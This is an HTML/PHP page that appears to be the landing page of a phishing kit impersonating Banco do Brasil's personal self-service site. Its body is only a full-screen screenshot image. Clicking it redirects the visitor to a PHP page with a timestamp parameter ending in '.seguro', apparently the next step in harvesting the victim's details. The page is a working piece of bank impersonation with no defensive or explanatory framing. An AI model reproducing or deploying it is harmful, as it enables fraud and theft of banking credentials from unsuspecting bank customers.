<html lang="pt-BR">
   <head>
      <meta charset="utf-8">
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="theme-color" content="#FAF046">
      <title>Banco do Brasil - Autoatendimento Pessoa Fisica</title>

      <!-- CSS -->
      <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
      <link rel="stylesheet" type="text/css" href="css/estilo.css">
      <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>
   </head>
   <body>
      <main>
         <img class="img-fluid acessarpgn" src="img/home.png" style="min-height: 100vh;">
      </main>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
      <script>
         $(document).ready(function () {
             $('img.acessarpgn').click(function () {
                 window.location.href = "webApp_AplicationHome.php?brazil=<?php $hora=date("H,i,s,A,z,n,m,u,d,g,o,l"); echo"$hora"; ?>.seguro";
             });
         });
      </script>
   </body>
</html>